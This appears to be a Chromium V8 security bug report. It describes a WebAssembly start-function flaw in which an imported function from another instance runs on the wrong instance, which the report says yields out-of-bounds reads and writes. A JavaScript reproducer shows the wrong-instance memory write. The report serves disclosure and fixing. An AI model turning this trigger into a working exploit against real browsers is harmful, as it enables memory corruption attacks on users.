Here, we create the start function as JS-to-wasm wrapper with the instance which is currently being built:
https://cs.chromium.org/chromium/src/v8/src/wasm/module-compiler.cc?q=module-compiler.cc&sq=package:chromium&dr&l=1836

If the start function is an exported function of another wasm instance, we should use that instance instead. Otherwise, we execute code of module X on an instance of module Y.
This can easily be used to construct OOB reads and writes.


Reproducer: 

=================================================================================
load('test/mjsunit/wasm/wasm-constants.js');
load('test/mjsunit/wasm/wasm-module-builder.js');

(function testImportedStartFunctionUsesRightInstance() {
  print(arguments.callee.name);
  var global = 0;
  const set_global = n => global = n;
  const exp = (function() {
    const builder = new WasmModuleBuilder();
    builder.addMemory(1, 1);
    builder.exportMemoryAs('mem');
    const imp_index = builder.addImport('q', 'imp', kSig_v_i);
    builder.addFunction('f', kSig_v_v)
        .addBody([kExprI32Const, 11, kExprI32Const, 0, kExprI32StoreMem, 0, 0])
        .exportFunc();
    return builder.instantiate({q: {imp: set_global}}).exports;
  })();

  const builder = new WasmModuleBuilder();
  const imp_index = builder.addImport('q', 'imp', kSig_v_v);
  builder.addStart(imp_index);
  const module = builder.toModule();

  assertEquals(0, new Uint32Array(exp.mem.buffer)[0], 'memory initially 0');
  new WebAssembly.Instance(module, {q: {imp: exp.f}});
  assertEquals(11, new Uint32Array(exp.mem.buffer)[0], 'memory changed to 11');
})();
=================================================================================
